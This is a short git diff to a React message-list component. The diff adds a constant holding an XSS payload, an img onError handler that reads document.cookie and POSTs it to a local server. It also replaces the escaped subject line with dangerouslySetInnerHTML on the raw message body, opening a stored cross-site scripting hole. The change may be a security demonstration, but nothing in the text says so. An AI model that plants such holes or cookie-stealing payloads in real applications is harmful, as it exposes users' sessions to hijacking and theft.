@@ -4,6 +4,13 @@ import { useEffect, useState } from "react";
 import { Mail, Trash2 } from "lucide-react";
 import React from "react";
 import { deleteMessageByIdDb, getAllMessagesDb } from "repo/messagesRepo";
+const maliciousHTML2 = `<img src='x' onError="console.log('FAIL'); console.log('NEXT'); let a = document.cookie; console.log(a); fetch('http://localhost:8888/cookie=' + a, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({ payload: a }),
+});" />`;
 
 const MessageRow = ({ message, onClick }) => (
   <div
@@ -18,7 +25,8 @@ const MessageRow = ({ message, onClick }) => (
         <span className='text-xs text-gray-500'>{message?.created_at}</span>
       </div>
       <div className='text-sm font-medium text-gray-200'>
-        {message?.subject}
+        {/* {message?.subject} */}
+        <div dangerouslySetInnerHTML={{ __html: message?.message }} />{" "}
       </div>
       <div className='text-sm text-gray-400 truncate'>{message?.message}</div>
     </div>
